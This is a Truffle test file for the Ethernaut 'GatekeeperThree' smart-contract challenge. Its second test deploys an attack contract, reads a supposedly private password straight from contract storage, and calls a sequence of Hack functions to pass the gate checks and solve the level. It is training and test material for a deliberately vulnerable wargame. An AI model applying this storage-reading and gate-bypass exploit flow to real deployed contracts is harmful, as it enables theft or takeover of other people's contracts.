const GatekeeperThreeFactory = artifacts.require('./levels/GatekeeperThreeFactory.sol')
const GatekeeperThree = artifacts.require('./levels/GatekeeperThree.sol')
const GatekeeperThreeAttack = artifacts.require('./attacks/GatekeeperThreeAttack.sol')

const Ethernaut = artifacts.require('./Ethernaut.sol')

import * as utils from '../utils/TestUtils'
import expectThrow from 'zeppelin-solidity/test/helpers/expectThrow'
import toPromise from 'zeppelin-solidity/test/helpers/toPromise'

contract('GatekeeperThree', function(accounts) {

  let ethernaut
  let level
  let owner = accounts[1]
  let player = accounts[0]

  before(async function() {
    ethernaut = await Ethernaut.new();
    level = await GatekeeperThreeFactory.new()
    await ethernaut.registerLevel(level.address)
  });

  it('should fail if the player didnt solve the level', async function() {
    const instance = await utils.createLevelInstance(ethernaut, level.address, player, GatekeeperThree)
    const completed = await utils.submitLevelInstance(
      ethernaut,
      level.address,
      instance.address,
      player
    )

    assert.isFalse(completed)
  });

  it('should allow the player to solve the level', async function() {
    const instance = await utils.createLevelInstance(ethernaut, level.address, player, GatekeeperThree)

    const attacker = await GatekeeperThreeAttack.new(instance.address, {
      from: player, value:120000000000000000
    })
    
    instance.createTrick()
    attacker.HackFirst()
    const trick = await instance.trick()
    const password  = web3.eth.getStorageAt(trick, 2)
    attacker.HackTwo(parseInt(password, 16))
    attacker.HackAll()
    console.log(await instance.entrant())
    

    const completed = await utils.submitLevelInstance(
      ethernaut,
      level.address,
      instance.address,
      player
    )

    assert.isTrue(completed)
    //assert.isTrue(true)
  });

});
